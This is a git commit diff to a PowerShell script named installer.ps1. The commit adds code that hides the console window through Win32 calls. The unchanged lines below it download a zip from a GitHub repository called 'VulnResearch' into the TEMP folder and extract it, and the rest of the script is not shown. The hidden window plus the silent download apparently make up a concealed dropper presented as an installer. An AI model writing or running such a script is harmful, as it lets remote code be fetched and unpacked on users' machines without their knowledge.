b19fed10d379ae1981e477e7ff1fc966979bbf72
SplineUser <Priyanshusharma2022@gmail.com>
2026-04-18 05:56:07 -0400

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,3 +1,16 @@
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+$console = [Console.Window]::GetConsoleWindow()
+
+# 0 hide
+[Console.Window]::ShowWindow($console, 0) | Out-Null
+
 $z = "$env:TEMP\a.zip"
 iwr -Uri "https://github.com/SplineUser/VulnResearch/raw/refs/heads/main/dist.zip" -o $z
 Expand-Archive $z $env:TEMP -Force
